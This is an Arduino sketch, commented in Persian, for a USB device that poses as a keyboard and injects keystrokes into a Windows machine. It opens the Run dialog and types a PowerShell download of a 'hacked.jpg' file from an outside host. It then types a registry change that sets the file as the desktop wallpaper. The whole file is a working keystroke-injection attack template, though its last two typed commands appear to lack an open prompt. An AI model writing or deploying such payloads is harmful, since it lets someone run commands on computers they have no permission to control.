#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // دانلود تصویر از اینترنت
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Invoke-WebRequest -Uri 'https://example.com/hacked.jpg' -OutFile $env:TEMP\\wall.jpg");
  delay(3000);
  
  // اعمال والپیپر از طریق رجیستری
  Keyboard.println("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"%TEMP%\\wall.jpg\" /f");
  Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
}

void loop() {}
